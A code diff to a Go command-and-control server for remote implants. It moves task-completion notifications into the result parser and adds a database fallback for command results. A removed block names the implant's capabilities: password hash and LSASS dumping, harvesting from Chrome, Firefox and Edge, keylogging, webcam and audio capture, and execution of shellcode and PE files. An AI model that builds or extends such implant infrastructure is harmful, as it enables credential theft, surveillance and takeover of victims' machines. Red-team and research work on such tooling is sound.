@@ -148,7 +148,7 @@ func (s *C2Server) BeaconStream(stream pb.C2Service_BeaconStreamServer) error {
 			// Heartbeat received - last seen already updated above
 		case pb.BeaconMessage_TASK_RESULT:
 			// Parse result payload: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
-			s.parseAndStoreCommandResult(string(msg.Payload))
+			s.parseAndStoreCommandResult(string(msg.Payload), msg.ImplantId)
 		case pb.BeaconMessage_ERROR:
 			logrus.Errorf("Error from %s: %s", msg.ImplantId, string(msg.Payload))
 		case pb.BeaconMessage_LOG:
@@ -209,72 +209,6 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 		logrus.Errorf("Error: %s", result.Error)
 	}
 
-	// Helper to broadcast task completion (only for long-running commands)
-	go func() {
-		// Get task/command type from database to check if it's a long-running command
-		var taskType string
-
-		// First try DBTask table (for queued tasks)
-		task, err := s.db.GetTaskByID(result.TaskId)
-		if err == nil {
-			taskType = task.Type
-		} else {
-			// Fallback to DBCommand table (for stream-sent commands)
-			cmd, err := s.db.GetCommand(result.TaskId)
-			if err != nil {
-				return // Can't determine task type, skip notification
-			}
-			taskType = cmd.Type
-		}
-
-		// Only notify for long-running commands
-		longRunningCommands := map[string]bool{
-			"NETWORK_SCAN":         true,
-			"IFCONFIG":             true,
-			"HASHDUMP":             true,
-			"DUMP_LSASS":           true,
-			"HARVEST_CHROME":       true,
-			"HARVEST_FIREFOX":      true,
-			"HARVEST_EDGE":         true,
-			"HARVEST_ALL_BROWSERS": true,
-			"CLIPBOARD_MONITOR":    true,
-			"KEYLOG_STOP":          true,
-			"AUDIO_CAPTURE":        true,
-			"WEBCAM_CAPTURE":       true,
-			"EXECUTE_ASSEMBLY":     true,
-			"EXECUTE_SHELLCODE":    true,
-			"EXECUTE_PE":           true,
-			"EXECUTE_BOF":          true,
-		}
-
-		if !longRunningCommands[taskType] {
-			return // Skip notification for quick commands
-		}
-
-		// Get implant info for notification
-		s.sessionsMux.RLock()
-		session, exists := s.sessions[result.ImplantId]
-		s.sessionsMux.RUnlock()
-
-		if exists {
-			output := string(result.Output)
-			cutoff := 100
-			if len(output) < cutoff {
-				cutoff = len(output)
-			}
-			preview := output[:cutoff]
-			if len(output) > cutoff {
-				preview += "..."
-			}
-
-			msg := fmt.Sprintf("Task %s completed: %s", result.TaskId, preview)
-			if !result.Success {
-				msg = fmt.Sprintf("Task %s failed: %s", result.TaskId, result.Error)
-			}
-			s.broadcastSessionEvent(pb.SessionEvent_TASK_COMPLETED, session, msg)
-		}
-	}()
-
 	// Store the result so GetCommandResult can retrieve it
 	// Format the payload as expected by parseAndStoreCommandResult: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
 	var payload string
@@ -283,7 +217,8 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 	} else {
 		payload = fmt.Sprintf("%s|false|%s", result.TaskId, result.Error)
 	}
-	s.parseAndStoreCommandResult(payload)
+	// parseAndStoreCommandResult handles both storage and task completion notifications
+	s.parseAndStoreCommandResult(payload, result.ImplantId)
 
 	return &pb.TaskAck{
 		Received: true,
@@ -861,6 +796,23 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 	result, exists := s.commandResults[req.CommandId]
 	s.resultsMux.RUnlock()
 
+	// If not in memory, check database first
+	if !exists {
+		dbResult, err := s.db.GetCommandResult(req.CommandId)
+		if err == nil && dbResult != nil {
+			// Found in database, use it and cache it
+			result = dbResult
+			exists = true
+
+			s.resultsMux.Lock()
+			s.commandResults[req.CommandId] = dbResult
+			s.resultsMux.Unlock()
+
+			logrus.Infof("Retrieved command result from database: %s", req.CommandId)
+		}
+	}
+
+	// If still not found, return not found
 	if !exists {
 		return &pb.CommandResultResponse{
 			Ready:   false,
@@ -886,31 +838,18 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 				}
 			}
 		}
-	}
 
-	// If still pending after timeout or not found in memory, check database as fallback
-	if !exists || result.Error == "Pending..." {
-		dbResult, err := s.db.GetCommandResult(req.CommandId)
-		if err == nil && dbResult != nil {
-			// Found in database, use it
-			result = dbResult
-			exists = true
+		// If still pending after timeout, check database again
+		if result.Error == "Pending..." {
+			dbResult, err := s.db.GetCommandResult(req.CommandId)
+			if err == nil && dbResult != nil && dbResult.Error != "Pending..." {
+				result = dbResult
 
-			// Also update in-memory cache for future requests
-			s.resultsMux.Lock()
-			s.commandResults[req.CommandId] = dbResult
-			s.resultsMux.Unlock()
-
-			logrus.Infof("Retrieved command result from database: %s", req.CommandId)
+				s.resultsMux.Lock()
+				s.commandResults[req.CommandId] = dbResult
+				s.resultsMux.Unlock()
+			}
 		}
-	}
-
-	if !exists {
-		return &pb.CommandResultResponse{
-			Ready:   false,
-			Success: false,
-			Error:   "Command not found",
-		}, nil
 	}
 
 	ready := result.Error != "Pending..."
